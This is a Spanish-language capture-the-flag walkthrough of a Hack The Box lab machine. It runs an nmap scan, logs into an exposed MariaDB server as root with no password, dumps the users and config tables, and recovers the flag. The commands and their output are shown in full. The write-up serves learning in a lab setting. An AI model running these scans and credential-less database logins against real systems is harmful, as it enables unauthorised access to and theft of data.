## Iniciamos la vpn
sudo openvpn starting_point_scr1pter98.ovpn
##Conectados ya a la red de la máquina víctima..
 ## WhichSystem

[*] 10.129.36.232 (ttl -> 63): Linux

## NMAP
# Descubramos puertos y servicios en la máquina objetivo

nmap --open -sS -p- -sCV -n -Pn -vvv 10.129.36.232 -oG escaneoNmap

#Encontramos en este caso el puerto 3306 con protocolo TCP, muy probablemente se trate de  mySQL

nmap -p 3306 --script=mysql-info 10.129.165.142

Nmap scan report for 10.129.165.142

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 83
|   Capabilities flags: 63486
|   Some Capabilities: InteractiveClient, ODBCClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, Speaks41ProtocolOld, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Support41Auth, FoundRows, SupportsTransactions, ConnectWithDatabase, LongColumnFlag, SupportsCompression, Speaks41ProtocolNew, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 8|.lVJN*%yU~:E,InkQ3
|_  Auth Plugin Name: mysql_native_password

#Logramos conectarnos

mariadb -h 10.129.165.142 -u root -p --skip-ssl

Enter password:      /en este caso no tenia contraseña

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 121
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>

## 1) Veamos que bases hay con SHOW DATABASES;
#Encontramos 4 bases de datos

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0,183 sec)

## 2) Seleccionemos la base de datos que queremos inspeccionar: 

USE nombre_de_la_base_de_datos;

#Veamos sus tablas

MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+

#Esto habia en la tabla users

MariaDB [htb]> SELECT * FROM users LIMIT 10;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0,178 sec)

##Veamos en la tabla config

MariaDB [htb]> SELECT * FROM htb.passwords;
ERROR 1146 (42S02): Table 'htb.passwords' doesn't exist
MariaDB [htb]> SELECT * FROM htb.password;
ERROR 1146 (42S02): Table 'htb.password' doesn't exist
MariaDB [htb]> SELECT * FROM htb.config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0,178 sec)

## Y aquí encontramos la FLAG > 7b4bec00d1a39e3dd4e021ec3d915da8
